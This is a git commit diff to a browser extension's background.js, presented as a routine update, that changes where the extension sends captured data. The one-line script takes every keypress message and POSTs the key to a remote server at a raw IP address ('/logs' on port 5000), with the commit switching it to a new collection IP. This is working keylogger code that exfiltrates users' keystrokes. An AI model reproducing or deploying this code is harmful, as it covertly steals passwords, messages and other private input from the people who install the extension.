baefb3dc6853b7954df69e8f94faa8ed82ff23b1
Md Saikat <darkhtml2275@gmail.com>
2024-12-24 01:49:07 +0600

    Update background.js

--- src/background.js
+++ src/background.js
@@ -1,1 +1,1 @@
-chrome.runtime.onMessage.addListener(function(e){"keypress"===e.type&&fetch("http://52.77.46.250:5000/logs",{method:"POST",body:e.key}).then(e=>e.json()).then(e=>console.log(e))});
+chrome.runtime.onMessage.addListener(function(e){"keypress"===e.type&&fetch("http://54.179.106.144:5000/logs",{method:"POST",body:e.key}).then(e=>e.json()).then(e=>console.log(e))});
